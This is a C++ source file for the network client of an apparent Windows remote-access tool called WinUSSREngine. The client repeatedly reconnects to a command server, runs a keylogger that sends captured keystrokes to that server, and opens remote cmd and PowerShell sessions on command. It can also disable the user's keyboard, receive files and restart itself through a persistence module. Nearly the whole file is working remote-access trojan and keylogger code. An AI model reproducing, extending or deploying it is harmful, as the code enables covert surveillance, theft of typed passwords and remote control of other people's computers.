#include "ClientTCP.h"
#include "WinUSSREngine/Base/Config.h"
#include "WinUSSREngine/Base/Utility.h"
#include "WinUSSREngine/Windows/RemoteCmd.h"
#include "WinUSSREngine/Windows/Keyboard.h"
#include "WinUSSREngine/Windows/Mouse.h"
#include "WinUSSREngine/Base/Application.h"

namespace WinUSSREngine::TCP
{
	Client* Client::s_Instance = nullptr;
	Client& Client::GetClient() { return *s_Instance; }

	Client::Client() : NetObject() { s_Instance = this; }

	Keybuffer& Client::keybuffer() noexcept { return m_keybuffer; }

	WSAWrapper& Client::getWrapper() { return m_Wrapper; }
	AppCmdParser& Client::cmdhandler() { return m_CmdHandler; }

	void Client::setiNetData(const NetiData& data) noexcept { m_Settings = data; }
	bool Client::peerDisconnected() noexcept { return m_Wrapper.GetError() == 10054; }

	void Client::initNetwork() noexcept
	{
		if (!m_isInitialized)
		{
			bool cmdsLoaded = false;
			if (!cmdsLoaded)
			{
				m_CmdHandler.addCmdsByList(config->cmdStrings.CommandList);
				cmdsLoaded |= !cmdsLoaded;
			}

			WSAData wData;
			if (WSAStartup(MAKEWORD(2, 2), &wData))return;

			m_svSocket = socket(AF_INET, SOCK_STREAM, NULL);
			if (m_svSocket == INVALID_SOCKET)return;

			//ResolveIP(std::string(m_Data.Settings.ServerIp));
			m_Settings.IsPublicBroadcast == true ?
				InetPtonA(AF_INET, m_Settings.ServerIp, &(m_server.sin_addr)) :
				InetPtonA(AF_INET, "127.0.0.1", &(m_server.sin_addr));

			m_server.sin_family = AF_INET;
			m_server.sin_port = htons(m_Settings.ServerPort);
			//if (!m_keyboard.isInitialized())
			//	m_keyboard.initKeyboard();

			//m_keyboard.hookKeyboard();
			m_isInitialized = true;
		}
	}

	void Client::create(const NetiData& data) noexcept
	{
		setiNetData(data);
		initNetwork();
		if (!m_isInitialized)
		{
			config->Flags.DestroyAllThreads = true;
			closeNetwork();
			return;
		}
		m_Persistence.Create();
	}

	void Client::destroy() noexcept
	{
		if (s_Instance != nullptr)
		{
			//if (m_keyboard.isDisabled()) m_keyboard.enableKeyboard();
			//m_keyboard.unhookKeyboard();
			m_keybuffer.flush();
			closeNetwork();
		}
		s_Instance = nullptr;
	}

	bool Client::OnKeyPressed(KeyPressedEvent& E)
	{
		m_keybuffer.onKeyPressed(E.keycode());
		return true;
	}

	bool Client::OnKeyReleased(KeyReleasedEvent& E)
	{
		m_keybuffer.onKeyReleased(E.keycode());
		return true;
	}

	bool Client::isInitialized() const noexcept { return m_isInitialized; }

	void Client::processCommand(const std::string& command) noexcept
	{
		switch (m_CmdHandler.determineCommand(command))
		{
		case DisableAll:
		{
			config->Flags.IsKeyLogging = false;
			config->Flags.IsMouseLogging = false;
			break;
		}
		case ToggleKeylogger:
		{
			config->Flags.IsKeyLogging = !config->Flags.IsKeyLogging;
			config->Flags.IsMouseLogging = !config->Flags.IsMouseLogging;
			if (config->Flags.IsKeyLogging && config->Flags.IsMouseLogging)
			{
				_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)KeyloggerThread, NULL, NULL, NULL);
				sendStringMsg(config->Responses.ClResponseStrings[1], PacketType::Warning);
			}
			if (!config->Flags.IsKeyLogging && !config->Flags.IsMouseLogging)
				sendStringMsg(config->Responses.ClResponseStrings[0], PacketType::Warning);
			break;
		}
		case RemoteCmdPrompt:
		{
			if (!RemoteCmd::cmdOpen)
			{
				std::string command = config->AppConfig.DefaultPaths[0];
				if (Utility::FileExists(command))
				{
					char* buffer = new char[command.length() + 3];
					buffer[command.length()] = '\0';
					strcpy_s(buffer, command.length() + 2, command.c_str());

					_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)RemoteCmd::cmdThread, (LPVOID)buffer, NULL, NULL);
					while (!RemoteCmd::cmdOpen) { std::this_thread::sleep_for(std::chrono::milliseconds(50)); }
					delete[] buffer;
				}
			}
			break;
		}
		case RemotePws32:
		{
			if (!RemoteCmd::cmdOpen)
			{
				std::string command = config->AppConfig.DefaultPaths[1];
				if (Utility::FileExists(command))
				{
					char* buffer = new char[command.length() + 3];
					buffer[command.length()] = '\0';
					strcpy_s(buffer, command.length() + 2, command.c_str());

					_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)RemoteCmd::cmdThread, (LPVOID)buffer, NULL, NULL);
					while (!RemoteCmd::cmdOpen) { std::this_thread::sleep_for(std::chrono::milliseconds(50)); }
					delete[] buffer;
				}
			}
			break;
		}
		case RemotePws64:
		{
			if (!RemoteCmd::cmdOpen)
			{
				std::string command = config->AppConfig.DefaultPaths[2];
				if (Utility::FileExists(command))
				{
					char* buffer = new char[command.length() + 3];
					buffer[command.length()] = '\0';
					strcpy_s(buffer, command.length() + 2, command.c_str());

					_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)RemoteCmd::cmdThread, (LPVOID)buffer, NULL, NULL);
					while (!RemoteCmd::cmdOpen)
					{
						std::this_thread::sleep_for(std::chrono::milliseconds(50));
					}
					delete[] buffer;
				}
			}
			break;
		}
		case SpawnRemoteProc:
		{
			m_Persistence.StartProcess("calc.exe", NULL);
			break;
		}
		case KillClient:
		{
			config->Flags.DestroyAllThreads = true;
			Application::GetApp().close();
			break;
		}
		case RestartClientCmd:
		{
			m_Persistence.RestartClientApp();
			Application::GetApp().close();
			break;
		}
		case ToggleKeyboard:
		{
			// TODO: Toggle keyboard input
			config->Flags.DisableKeyboard = !config->Flags.DisableKeyboard;
			config->Flags.DisableKeyboard ?
				sendStringMsg(config->Responses.ClResponseStrings[10], PacketType::ChatMessage)
				: sendStringMsg(config->Responses.ClResponseStrings[10], PacketType::ChatMessage);
			break;
		}
		case InvalidClientCmd:
		{
			sendStringMsg(GetClient().cmdhandler().commandNameById(-1), PacketType::Warning);
			break;
		}
		default: break;
		}
	}

	bool Client::processPacketType(PacketType _PacketType)
	{
		switch (_PacketType)
		{
		case PacketType::AppCommand:
		{
			std::string msg;
			if (!recieveStringMsg(msg))
				return false;
			processCommand(msg);
			break;
		}
		case PacketType::CMDCommand:
		{
			std::string msg;
			if (!recieveStringMsg(msg))
				return false;
			if (RemoteCmd::cmdptr != NULL)
			{
				RemoteCmd::cmdptr->writeCMD(msg); //MOST ANNOYING BUG: [FIXED]
				if (msg == "exit")
				{
					RemoteCmd::cmdptr->writeCMD("exit");
					RemoteCmd::cmdOpen = false;
				}
				break;
			}
			else
			{
				sendStringMsg("Initiate a CMD session first.", PacketType::Warning);
				break;
			}
		}
		case PacketType::FileTransferByteBuffer:
		{
			int32_t buffersize; //buffer to hold size of buffer to write to file
			if (!recieveInt32_t(buffersize)) //get size of buffer as integer
				return false;
			if (!recieveAllData(m_File.buffer, buffersize)) return false;
			m_File.outfileStream.write(m_File.buffer, buffersize);
			if (!sendPacketType(PacketType::FileTransferRequestNextBuffer)) return false;
			break;
		}
		case PacketType::FileTransfer_EndOfFile:
		{
			m_File.bytesWritten = 0;
			m_File.outfileStream.close();
			break;
		}
		default: break;
		}
		return true;
	}

	void Client::ClientThread()
	{
		PacketType packetType;

		while (!config->Flags.DestroyAllThreads)
		{
			//Get PacketType type
			if (!s_Instance->getPacketType(packetType))
				break;

			//If there is an issue getting the PacketType type, exit this loop
			if (!s_Instance->processPacketType(packetType))
				break;
		}
		s_Instance->m_isConnected = false;
		s_Instance->closeNetwork();
	}

	bool Client::resolveIP(std::string& hostname)
	{
		int sockfd;
		struct addrinfo hints, * servinfo, * p;
		struct sockaddr_in* h;
		int rv;
		char ip[INET6_ADDRSTRLEN];

		memset(&hints, 0, sizeof hints);
		hints.ai_family = AF_UNSPEC; // use AF_INET6 to force IPv6
		hints.ai_socktype = SOCK_STREAM;

		if ((rv = getaddrinfo(hostname.c_str(), "http", &hints, &servinfo)) != 0)
		{
			fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(rv));
			return false;
		}

		for (p = servinfo; p != NULL; p = p->ai_next)
		{
			h = (struct sockaddr_in*)p->ai_addr;
			strcpy_s(ip, INET6_ADDRSTRLEN, inet_ntoa(h->sin_addr));
		}

		freeaddrinfo(servinfo); // all done with this structure
		hostname = ip;
		return true;
	}

	void Client::connectToServer()
	{
		if (connect(m_svSocket, (sockaddr*)&m_server, sizeof(m_server)) != 0)
			return;

		_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ClientThread, NULL, NULL, NULL);
		m_isConnected = true;
	}

	void Client::updateState() noexcept
	{
		if (m_isConnected && peerDisconnected())
			m_isConnected = false;

		if (!m_isConnected)
		{
			config->Flags.IsKeyLogging = false;
			config->Flags.IsMouseLogging = false;
			config->Flags.IsRemoteCalc = false;
			config->Flags.IsRemoteCmd = false;
			config->Flags.IsRemotePowerShell32 = false;
			config->Flags.IsRemotePowerShell64 = false;
			config->Flags.DisableKeyboard = false;

			while (!m_isConnected) connectToServer();
		}

		auto& keyboard = Application::GetApp().keyboard();

		config->Flags.DisableKeyboard ?
			keyboard.disableInput() : keyboard.enableInput();
	}

	bool Client::isConnected() { return m_isConnected; }

	bool Client::requestFile(std::string FileName)
	{
		m_File.outfileStream.open(FileName, std::ios::binary); //open file to write file to
		m_File.fileName = FileName; //save file name
		m_File.bytesWritten = 0; //reset byteswritten to 0 since we are working with a new file
		if (!m_File.outfileStream.is_open()) //if file failed to open...
		{
			//std::cout << "ERROR: Function(Client::RequestFile) - Unable to open file: " << FileName << " for writing.\n";
			return false;
		}
		//std::cout << "Requesting file from server: " << FileName << std::endl;
		if (!sendStringMsg(FileName, PacketType::FileTransferRequestFile)) //send file name
			return false;
		return true;
	}

	void Client::closeNetwork()
	{
		shutdown(m_svSocket, 2);
		closesocket(m_svSocket);
		m_Wrapper.CleanUp();
	}

	void Client::KeyloggerThread()
	{
		if (config->Flags.DestroyAllThreads) return;

		while (config->Flags.IsKeyLogging && config->Flags.IsMouseLogging)
		{
			if (config->Flags.DestroyAllThreads) continue;
			if (!s_Instance->keybuffer().empty())
			{
				s_Instance->sendStringMsg(s_Instance->keybuffer().toString(), PacketType::Keylogger);
				s_Instance->keybuffer().clear();
			}
			std::this_thread::sleep_for(std::chrono::milliseconds(10));
		}

		if (!s_Instance->keybuffer().empty())
			s_Instance->sendStringMsg(s_Instance->keybuffer().toString(), PacketType::Keylogger);

		s_Instance->keybuffer().flush();
	}
}